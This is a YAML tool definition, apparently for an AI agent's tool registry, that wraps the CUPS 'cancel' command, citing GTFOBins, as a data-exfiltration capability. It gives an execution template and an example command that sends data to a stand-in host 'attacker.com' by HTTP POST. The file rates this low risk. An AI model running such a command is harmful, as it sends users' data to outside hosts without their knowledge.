---
id: system-print-cancel
namespace: system:print:cancel
name: cancel
description: Cancel CUPS print jobs, can exfiltrate data via HTTP POST requests.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - network.transfer.upload
platforms:
  - linux
risk_level: low
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - lp
artifacts: []
workflow_edges:
  produces: []
  consumes: []
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Command output
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 4
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: low
  disk_io: low
allowed-tools:
  - cancel
  - Bash
  - execFile
parameters:
  - name: dest
    type: string
    required: false
    description: "Destination host and port"
  - name: data
    type: string
    required: false
    description: "Data to upload"
features: []
execution:
  template: "cancel -h {dest} -u {data}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Exfiltrate data via cancel HTTP POST
    command: cancel -h attacker.com:12345 -u DATA
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/cancel/"
techniques:
  - exfiltration
install:
  - method: apt
    package_name: "cups-client"
    commands:
      - "apt-get install -y cups-client"
---
